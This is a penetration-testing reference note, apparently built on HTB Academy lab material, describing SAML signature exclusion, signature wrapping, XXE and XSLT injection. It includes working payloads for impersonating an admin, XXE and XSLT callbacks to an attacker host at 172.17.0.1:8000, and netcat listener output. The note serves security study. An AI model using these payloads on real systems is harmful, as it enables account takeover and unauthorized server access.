---
technique: "SAML"
family: "auth-session"
severity_hint: "high"
tags: ["Authentication", "SAML", "API", "Account Takeover", "XXE", "HTTP", "Auth"]
source: "_raw/Web attacks/Web Attacks/SAML.md"
source_sha256: "92d39bf9a06270901f25a1729a889628a5459d1147e11ce517e3736f3423fc19"
curator_version: 2
review_status: imported-unreviewed
---

# SAML

> Family: **auth-session** · Severity hint: **high** · Tags: Authentication, SAML, API, Account Takeover, XXE, HTTP, Auth
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `xml: <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"`
- `xml: <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic"`
- `xml: POST /acs.php HTTP/1.1`
- `xml: <samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >`
- `xml: <samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >`
- `xml: <samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >`
- `xml: <?xml version="1.0" encoding="UTF-8"?>`
- `bash: $ nc -lnvp 8000`
- `xml: <?xml version="1.0" encoding="utf-8"?>`
- `python: POST /acs.php HTTP/1.1`
- `python: $ nc -lnvp 8000`

## Playbook (operator notes)

# SAML

[SAML Attacks](https://book.hacktricks.xyz/pentesting-web/saml-attacks)

# **Signature Exclusion Attack**

- Manipulates the SAML response by removing the signature
- If a service provider is misconfigured only to verify the signature if one is present and defaults to accepting the SAML response, removing the signature enables an attacker to manipulate the SAML response to impersonate other users

# **Signature Verification**

- If we want to impersonate a different user we need to change the values in the SAML assert used by the web application for authentication

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
	<saml:AttributeValue xsi:type="xs:string">htb-stdnt</saml:AttributeValue>
</saml:Attribute>
```

```xml
<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
	<saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
</saml:Attribute>
```

- Then B64 and URL encode the payload

```xml
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 8811
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhb[...]%3d&RelayState=%2Facs.php
```

- However, since the application checks the signature this will not be a valid request

# **Signature Exclusion**

- If a web app is severely misconfigured, it may skip the signature verification entirely if the SAML response does not contain a signature XML element
- Change the data again, but this time remove all the signature `ds:Signature` elements

---

# Signature Wrapping

- Intends to create a discrepancy between the signature verification logic and the logic extracting the authentication information from the SAML assertion
- Archived by injecting XML elements into the SAML response that do not invalidate the signature but potentially confuse the application, resulting in the application using the injected and unsigned authentication information instead of the signed authentication information

# **Theory**

- IdP can sign the entire SAML response or only the SAML Assertion
- Element signed by a `ds:Signature` XML-node is referenced in the `ds:Reference` XML-node

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
	[...]
	<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
	    [...]
	    <ds:Signature>
	      <ds:SignedInfo>
	            [...]
	            <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
              [...]
					    </ds:Reference>
		    </ds:SignedInfo>
		  </ds:Signature>
	    [...]
	</saml:Assertion>
</samlp:Response>
```

- `<ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">`
    - Indicates that the signature was computed over the XML node `saml:Assertion`
    - Does not protect the entire SAML response

## Types of signatures

- Furthermore, there are different locations where the signature can be located
    - `enveloped` signatures are descendants of the signed resource
        - Example above
    - `enveloping` signatures are predecessors of the signed resource
        
        ```xml
        <samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
        	[...]
        	<ds:Signature>
        		<ds:SignedInfo>
        		    [...]
        		    <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
        	            [...]
        		    </ds:Reference>
        	    </ds:SignedInfo>
        		<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
        		    [...]    
        		</saml:Assertion> 
        		[...]
        	</ds:Signature>
        </samlp:Response>
        ```
        
    - `detached` signatures are neither descendants nor predecessors of the signed resource
        
        ```xml
        <samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
        	[...]
        	<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
        	    [...]
        	 </saml:Assertion> 
        	 <ds:Signature>
        	    <ds:SignedInfo>
        		    [...]
        		    <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
                        [...]
        	        </ds:Reference>
        	    </ds:SignedInfo>
        	</ds:Signature>
        	[...]
        </samlp:Response>
        ```
        
    
    ## Types of attacks
    
    - Depending on where the signature reference is and what it signs, different types of attacks can be launched
    
    ## Enveloped signature attack example
    
    
    
    - Create a new SAML assertion before the signed assertion
    
    
    
    - Does not invalidate the original signature
    - Since SAML response is not protected by a signature we can inject additional once
    - The signature wrapping attack is successful if the following holds
        - The signature verification logic searches the SAML response for the `ds:Signature` node and the element referenced in the `ds:Reference` element. The signature is then verified, and no additional checks are performed (such as a check of the number of SAML assertions present in the SAML response)
        - The application logic retrieves authentication information from the first SAML assertion it finds within the SAML response
        
        <aside>
        ⚠️ Keep the original XML formation, else it will trigger an invalid response
        
        </aside>
        
        <aside>
        ⚠️ Use Cyberchef to encode and decode
        
        </aside>
        

---

# **Additional SAML Vulnerabilities**

- Other attacks like XXE and XSLT based on XML are possible

# **XXE Injection**

- If provider relies on a misconfigured XML parser XXE possible

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
<samlp:Response>
	[...]
</samlp:Response>
```

```bash
$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52206
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```

# **XSLT Server-side Injection**

- Depending on how the parser handles the SAML response data XSLT possible

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('http://172.17.0.1:8000/')"/>
</xsl:template>
</xsl:stylesheet>
```

```python
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 361
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjx4c2w6c3R5bGVzaGVldCB2ZXJzaW9uPSIxLjAiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4NCjx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPg0KPHhzbDpjb3B5LW9mIHNlbGVjdD0iZG9jdW1lbnQoJ2h0dHA6Ly8xNzIuMTcuMC4xOjgwMDAvJykiLz4NCjwveHNsOnRlbXBsYXRlPg0KPC94c2w6c3R5bGVzaGVldD4%3d&RelayState=%2Facs.php
```

```python
$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57128
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```

<aside>
ℹ️ If injecting only the XSLT payload does not work, we should also attempt to inject the payload into the `ds:Transform` node of a valid SAML response to investigate whether the XSLT payload is triggered in the process of parsing the SAML data only if the SAML response contains valid authentication information

</aside>

<aside>
ℹ️ Note that the service provider might be vulnerable, even though our injected payload does not contain a valid SAML respons

</aside>

---

# **Tools of the Trade**

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)

## Source
Original note: `_raw/Web attacks/Web Attacks/SAML.md`
